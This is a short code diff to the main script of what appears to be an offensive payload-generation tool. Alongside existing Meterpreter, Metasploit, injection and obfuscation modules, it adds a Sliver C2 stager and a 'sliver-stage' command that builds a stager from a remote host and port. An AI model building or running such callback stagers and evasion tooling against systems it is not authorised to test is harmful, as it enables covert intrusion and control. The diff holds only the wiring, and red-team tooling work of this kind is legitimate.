@@ -8,6 +8,7 @@ import utils.formatout as formatout
 import utils.hashes as hashes
 import utils.header
 import utils.meterpreter as meterpreter
+import utils.sliver as sliver
 if os.name == 'nt':
   import utils.injection as injection
 import utils.msf as msf
@@ -53,6 +54,7 @@ def main(command_line=None):
   qrcode.qrcode_obfuscator.init()
   if os.name == 'nt':
     rolhash.ror2rol_obfuscator.init()
+  sliver.stager.init()
   uuid.uuid_obfuscator.init()
   xorpoly.xor.init()
   xor.xor_encoder.init()
@@ -72,6 +74,10 @@ def main(command_line=None):
 
   elif arguments.command == 'msfstager':
     stager = meterpreter.stager(arguments.remote_host, arguments.port, arguments.timeout, arguments.arch, arguments.sleep)
+    stager.process()
+
+  elif arguments.command == 'sliver-stage':
+    stager = sliver.stager(arguments.remote_host, arguments.port)
     stager.process()
 
 
